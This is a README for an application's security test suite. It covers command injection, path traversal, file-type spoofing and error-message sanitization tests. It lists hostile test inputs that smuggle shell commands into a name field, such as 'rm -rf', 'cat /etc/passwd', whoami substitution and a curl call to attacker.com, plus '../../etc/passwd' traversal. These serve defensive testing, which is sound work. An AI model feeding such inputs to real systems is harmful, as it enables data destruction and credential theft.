# Security Test Suite

Comprehensive security tests covering all CRITICAL vulnerabilities identified during Phase 1 security hardening.

## Test Coverage

### Command Injection (CRITICAL-1)
**File:** `commandInjection.test.ts`
**Mitigates:** CWE-78 OS Command Injection
**Coverage:** 8 tests
- Shell metacharacter injection attempts (`;`, `|`, `&`, `$`)
- Command substitution (backticks, `$(...)`)
- Safe character handling (Unicode, hyphens, apostrophes, parentheses, brackets)

**Key Tests:**
- Semicolon command separator (`ValidName; rm -rf /tmp/test`)
- Pipe command chaining (`ValidName | cat /etc/passwd`)
- Backtick command substitution (`` Image`whoami`Name ``)
- Dollar command substitution (`Image$(whoami)Name`)
- Ampersand background execution (`ValidName & curl attacker.com &`)

### Path Traversal (CRITICAL-2)
**File:** `pathTraversal.integration.test.ts`
**Mitigates:** CWE-22 Path Traversal
**Coverage:** 6 tests
- Absolute path outside allowed root
- Relative path traversal (`../`)
- Symlink traversal
- Sibling directory prefix bypass
- Legitimate subdirectory access

**Key Tests:**
- Absolute path bypass (`/tmp/outside-allowed-root/malicious.jpg`)
- Parent directory traversal (`../../etc/passwd`)
- Symlink following to restricted directories
- Sibling directory with similar prefix (`/allowed-root-backup/file.jpg`)

### File Content Validation (CRITICAL-3)
**File:** `fileContentValidation.test.ts`
**Mitigates:** CWE-434 Unrestricted File Upload
**Coverage:** 12 tests
- Malware disguised as images (.exe with .jpg extension)
- Video format validation (MP4/MOV ftyp box, AVI markers)
- Magic number verification for all supported formats
- Extension mismatch detection

**Key Tests:**
- Windows executable disguised as JPEG
- Script files disguised as PNG
- ZIP archives disguised as media files
- MP4 magic number verification (`ftyp`)
- MOV magic number verification (`ftyp`, `moov`)
- AVI magic number verification (`RIFF...AVI`)

### Error Sanitization (CRITICAL-5)
**File:** `errorSanitization.test.ts`
**Mitigates:** CWE-209 Information Disclosure
**Coverage:** 15 tests
- File path removal from error messages
- User-friendly error conversion (ENOENT → "File not found")
- Unix/Windows path sanitization
- Nested error property cleaning

**Key Tests:**
- ENOENT → "File not found" (no path disclosure)
- EACCES → "Permission denied" (no system details)
- Stack trace sanitization
- Unix absolute path removal (`/Users/alice/secret`)
- Windows absolute path removal (`C:\Users\alice\secret`)

## Running Security Tests

```bash
# Run all security tests
npm test -- electron/__tests__/security/

# Run specific category
npm test -- commandInjection.test.ts
npm test -- pathTraversal.integration.test.ts
npm test -- fileContentValidation.test.ts
npm test -- errorSanitization.test.ts

# Run with coverage
npm test -- --coverage electron/__tests__/security/
```

## Test Philosophy

**Exploit-Driven Testing:**
- Each test represents a real exploit scenario
- Tests use realistic attack patterns (not synthetic edge cases)
- Failures indicate actual security vulnerabilities

**Defense-in-Depth Validation:**
- Tests validate multiple layers (IPC boundary + service layer)
- Integration tests verify end-to-end security
- Unit tests verify individual validation functions

**Regression Prevention:**
- All tests must pass before merge
- CI enforces security test suite execution
- Breaking security tests = BLOCKING for deployment

## Maintenance

**Adding New Security Tests:**
1. Identify vulnerability (consult security-specialist)
2. Write exploit scenario test (RED phase)
3. Implement mitigation (GREEN phase)
4. Document in this README
5. Add to CI security test suite

**Review Schedule:**
- Quarterly: Review test coverage against OWASP Top 10
- Per Release: Validate all security tests passing
- Post-Incident: Add regression test for any security issue discovered

## Security Test Statistics

```
Total Security Tests:     41
Command Injection:        8 tests
Path Traversal:           6 tests
File Content Validation:  12 tests
Error Sanitization:       15 tests

Coverage: 100% of CRITICAL vulnerabilities from Phase 1
Status: All tests passing (100%)
```

## References

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [CWE Top 25](https://cwe.mitre.org/top25/)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [CWE-22: Path Traversal](https://cwe.mitre.org/data/definitions/22.html)
- [CWE-434: Unrestricted File Upload](https://cwe.mitre.org/data/definitions/434.html)
- [CWE-209: Information Disclosure](https://cwe.mitre.org/data/definitions/209.html)
- ADR-006: Security Hardening Strategy (project docs)
- [Electron Security Best Practices](https://www.electronjs.org/docs/latest/tutorial/security)
